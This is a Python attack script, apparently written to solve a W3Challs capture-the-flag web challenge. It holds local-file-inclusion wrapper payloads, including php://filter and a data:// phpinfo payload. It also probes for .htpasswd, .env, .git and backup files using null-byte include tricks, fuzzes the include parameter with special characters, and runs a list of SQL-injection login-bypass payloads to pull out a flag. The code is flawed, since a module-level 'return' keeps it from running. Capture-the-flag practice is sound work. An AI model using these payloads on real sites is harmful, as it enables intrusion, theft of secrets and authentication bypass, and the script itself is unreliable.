#!/usr/bin/env python3
import requests
import base64
import re

s = requests.Session()
base = "https://vip.hax.w3challs.com/"

print("[*] FINAL ATTACK STRATEGY...")

# Si hay restricciones de path, probablemente están usando algo como:
# include($_GET['page'] . '.php');
# Con validación que previene ../ y php://

# ESTRATEGIA 1: Leer el código fuente de index.php
print("\n[1] ATTEMPTING SOURCE CODE EXTRACTION...")

# Intentar variaciones del wrapper PHP
wrappers = [
    "php://filter/convert.base64-encode/resource=index",
    "PHP://filter/convert.base64-encode/resource=index",
    "php:filter/convert.base64-encode/resource=index",  # Sin //
    "php:/filter/convert.base64-encode/resource=index",  # Un solo /
    "php//filter/convert.base64-encode/resource=index",  # Sin :
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  # phpinfo
]

for wrapper in wrappers:
    r = s.get(f"{base}index.php?page={wrapper}")
    
    # Buscar base64 en la respuesta
    b64_matches = re.findall(r'[A-Za-z0-9+/]{100,}={0,2}', r.text)
    
    for b64_str in b64_matches:
        try:
            decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')
            if '<?php' in decoded or 'include' in decoded:
                print(f"[!!!] SOURCE CODE FOUND with {wrapper}")
                print(decoded[:500])
                
                # Buscar la flag en el código
                if 'flag' in decoded.lower():
                    flag_matches = re.findall(r'flag[^;]*;', decoded, re.IGNORECASE)
                    for match in flag_matches:
                        print(f"[!!!] FLAG REFERENCE: {match}")
                
                # Guardar el código
                with open("/workspace/source_code.php", "w") as f:
                    f.write(decoded)
                    
                return  # Encontramos el código, analizar
        except:
            pass

# ESTRATEGIA 2: Buscar archivos de configuración o backup
print("\n[2] SEARCHING FOR CONFIG/BACKUP FILES...")

config_files = [
    ".htaccess", ".htpasswd", 
    "config.php.bak", "config.bak", "config~",
    "database.sql", "backup.sql", "dump.sql",
    ".env", "env.php", "environment.php",
    "settings.ini", "config.ini", "php.ini",
    "web.config", "wp-config.php",
    ".git/config", ".git/HEAD", ".git/index",
    ".svn/entries", ".svn/wc.db",
    "composer.json", "package.json",
    "README", "README.md", "README.txt",
    "INSTALL", "INSTALL.txt", "TODO", "TODO.txt",
    "robots.txt", "sitemap.xml",
    "crossdomain.xml", "clientaccesspolicy.xml"
]

for file in config_files:
    # Directo
    r = s.get(f"{base}{file}")
    if r.status_code == 200 and 'Not Found' not in r.text and len(r.text) < 5000:
        print(f"[!] Found: {file}")
        if 'flag' in r.text.lower() or 'password' in r.text.lower():
            print(f"    Content: {r.text[:200]}")
    
    # Via include
    r = s.get(f"{base}index.php?page={file}%00")
    if len(r.text) != 736 and len(r.text) != 1796:
        print(f"[!] Via include: {file}")

# ESTRATEGIA 3: Fuzzing inteligente basado en el contexto
print("\n[3] CONTEXT-BASED FUZZING...")

# Sabemos que es un grupo de "pirates" con miembros
# Los líderes son LuG[3]R, Fr[4]Ger, K[1]LLeR
# Buscar archivos relacionados

context_files = [
    "luger", "lug3r", "LuG3R", "chief",
    "frager", "fr4ger", "Fr4Ger", "admiral",
    "killer", "k1ller", "K1LLeR", "commander",
    "pirates", "pirate", "army", "vip",
    "members", "member_list", "users_list",
    "troups", "troops", "soldiers",
    "research", "development", "r&d",
    "censorship", "spying", "control",
    "applicants", "applications", "apply",
    "closed_sites", "targets", "operations"
]

for file in context_files:
    r = s.get(f"{base}index.php?page={file}")
    if len(r.text) != 736:
        print(f"[!] Context file exists: {file}")
        
        # Verificar contenido
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(r.text, 'html.parser')
        corps = soup.find('div', {'id': 'corps'})
        if corps:
            content = corps.get_text(strip=True)
            if content and 'Welcome to' not in content:
                print(f"    Has content: {content[:100]}")

# ESTRATEGIA 4: Analizar el comportamiento del include
print("\n[4] INCLUDE BEHAVIOR ANALYSIS...")

# Probar qué pasa con diferentes caracteres especiales
special_tests = [
    (".", "dot"),
    ("..", "double dot"),
    ("...", "triple dot"),
    ("/", "slash"),
    ("//", "double slash"),
    ("\\", "backslash"),
    (":", "colon"),
    (";", "semicolon"),
    ("|", "pipe"),
    ("&", "ampersand"),
    (" ", "space"),
    ("\t", "tab"),
    ("\n", "newline"),
    ("\r", "carriage return"),
    ("\x00", "null byte raw"),
    ("<?php", "php tag"),
    ("?>", "php close"),
    ("'", "single quote"),
    ('"', "double quote"),
    ("`", "backtick"),
]

for char, name in special_tests:
    r = s.get(f"{base}index.php?page={char}")
    if 'Warning' in r.text or 'Error' in r.text:
        print(f"[!] Error with {name}: {char}")
        errors = re.findall(r'(Warning|Error):.*', r.text)[:1]
        for error in errors:
            print(f"    {error[:150]}")
            
            # Si el error revela el path
            if '/var/www' in error or '/home' in error or 'include(' in error:
                print(f"    [!!!] PATH DISCLOSED: {error}")

# ESTRATEGIA 5: Authentication bypass via SQL injection
print("\n[5] SQL INJECTION IN LOGIN...")

sqli_payloads = [
    ("admin' -- ", "password"),
    ("admin'#", "password"),
    ("' OR '1'='1' -- ", "' OR '1'='1' -- "),
    ("' OR 1=1 -- ", "' OR 1=1 -- "),
    ("admin' OR '1'='1", "password"),
    ("') OR ('1'='1", "') OR ('1'='1"),
    ("admin'/*", "*/OR'1'='1"),
    ("admin", "' OR '1'='1"),
    ("' UNION SELECT 'admin','$2y$10$zGkjg3n0bjx3O.ayFGbTYOe7NrGWMKpGjpU0tVrpjJi5jIv/yyXHW' -- ", "password"),  # bcrypt of 'password'
]

for user, pwd in sqli_payloads:
    data = {'login': user, 'pass': pwd}
    r = s.post(f"{base}index.php?page=login", data=data)
    
    # Check if login was successful
    if 'logout' in r.text.lower() or 'welcome' in r.text.lower() and 'Welcome to the VipWebArmy' not in r.text:
        print(f"[!!!] SQL INJECTION SUCCESS: {user} / {pwd}")
        
        # Try to access member area
        r_member = s.get(f"{base}index.php?page=member")
        if 'flag' in r_member.text.lower():
            print(f"[!!!] FLAG IN MEMBER AREA: {r_member.text}")
            
            # Extract flag pattern
            flag_patterns = [
                r'flag{[^}]+}',
                r'FLAG{[^}]+}',
                r'flag\{[^}]+\}',
                r'flag:[^<\s]+',
                r'flag is[^<]+',
                r'[0-9a-f]{32}',  # MD5
                r'[0-9a-f]{40}',  # SHA1
            ]
            
            for pattern in flag_patterns:
                matches = re.findall(pattern, r_member.text, re.IGNORECASE)
                for match in matches:
                    print(f"[!!!] POTENTIAL FLAG: {match}")